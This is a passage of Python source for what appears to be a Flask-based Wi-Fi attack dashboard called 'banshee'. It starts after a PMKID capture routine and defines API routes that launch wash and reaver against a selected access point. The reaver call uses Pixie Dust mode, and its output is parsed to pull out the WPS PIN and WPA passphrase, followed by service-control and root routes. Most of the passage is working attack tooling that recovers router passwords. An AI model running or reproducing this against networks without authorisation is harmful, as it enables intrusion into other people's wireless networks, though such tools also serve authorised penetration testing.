        write_capture_meta(dst, 'pmkid', inspect_pmkid_capture(dst))
        return jsonify({'ok': True, 'file': os.path.basename(dst), 'path': dst})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

# ── WPS ────────────────────────────────────────────────────────────
@app.route('/api/wps/scan', methods=['POST'])
def wps_scan():
    with lock:
        if not state['monitor_mode']:
            return jsonify({'ok': False, 'error': 'Monitor mode required'}), 400
        mon = state['mon_iface']
    if not tool_path('wash'):
        return jsonify({'ok': False, 'error': 'wash not installed — sudo apt install reaver'}), 400
    def _do():
        try:
            r = subprocess.run(['sudo', 'wash', '-i', mon, '--ignore-fcs'],
                               capture_output=True, text=True, timeout=8)
            output = r.stdout
        except subprocess.TimeoutExpired as e:
            output = (e.stdout or b'').decode('utf-8', errors='ignore') if isinstance(e.stdout, bytes) else (e.stdout or '')
        except Exception:
            return
        for line in output.splitlines():
            bssid, info = parse_wash_line(line.strip())
            if bssid:
                wps_data[bssid] = info
    threading.Thread(target=_do, daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/wps/data')
def wps_data_get():
    return jsonify(wps_data)

@app.route('/api/wps/start', methods=['POST'])
def wps_start():
    global wps_log
    with lock:
        if not state['monitor_mode']:
            return jsonify({'ok': False, 'error': 'Monitor mode required'}), 400
        if state['mode'] not in ('idle', 'cracking'):
            return jsonify({'ok': False, 'error': f'Busy: {state["mode"]}'}), 400
        bssid   = (state['selected'] or {}).get('bssid', '')
        channel = str((state['selected'] or {}).get('channel', ''))
        mon     = state['mon_iface']
        if not bssid:
            return jsonify({'ok': False, 'error': 'No target selected'}), 400
    if not tool_path('reaver'):
        return jsonify({'ok': False, 'error': 'reaver not installed — sudo apt install reaver'}), 400
    with lock:
        kill_proc('wps')
        wps_log = []
        state['wps_result'] = 'running'
        state['mode'] = 'wps'
        cmd = ['sudo', 'reaver', '-i', mon, '-b', bssid, '-K', '1', '-N', '-vvv']
        if channel:
            cmd += ['-c', channel]
        p = subprocess.Popen(cmd,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT,
                             text=True,
                             preexec_fn=os.setsid)
        procs['wps'] = p
    def _reader():
        pin = psk = None
        for line in p.stdout:
            line = line.rstrip()
            wps_log.append(line)
            if 'WPS PIN:' in line:
                pin = line.split('WPS PIN:')[-1].strip().strip('"\'')
            if 'WPA PSK:' in line:
                psk = line.split('WPA PSK:')[-1].strip().strip('"\'')
        p.wait()
        with lock:
            if pin and psk:
                state['wps_result'] = f'found:{pin}:{psk}'
            elif state['wps_result'] == 'running':
                state['wps_result'] = 'not_found'
            if state['mode'] == 'wps':
                state['mode'] = 'idle'
    threading.Thread(target=_reader, daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/wps/stop', methods=['POST'])
def wps_stop():
    global wps_log
    with lock:
        kill_proc('wps')
        state['wps_result'] = None
        wps_log = []
        if state['mode'] == 'wps':
            state['mode'] = 'idle'
    return jsonify({'ok': True})

@app.route('/api/wps/status')
def wps_status():
    with lock:
        return jsonify({
            'running': (procs.get('wps') is not None and
                        procs['wps'].poll() is None),
            'result':  state['wps_result'],
            'log':     wps_log[-40:],
        })

# ── App control ───────────────────────────────────────────────────
def _systemctl_user(action):
    uid = os.getuid()
    env = {**os.environ, 'XDG_RUNTIME_DIR': f'/run/user/{uid}'}
    time.sleep(0.5)
    subprocess.run(['systemctl', '--user', action, 'banshee'], env=env)

@app.route('/api/system/restart', methods=['POST'])
def system_restart():
    threading.Thread(target=_systemctl_user, args=('restart',), daemon=True).start()
    return jsonify({'ok': True})

@app.route('/api/system/stop', methods=['POST'])
def system_stop():
    threading.Thread(target=_systemctl_user, args=('stop',), daemon=True).start()
    return jsonify({'ok': True})

# ── Root ──────────────────────────────────────────────────────────
@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5200, debug=False)
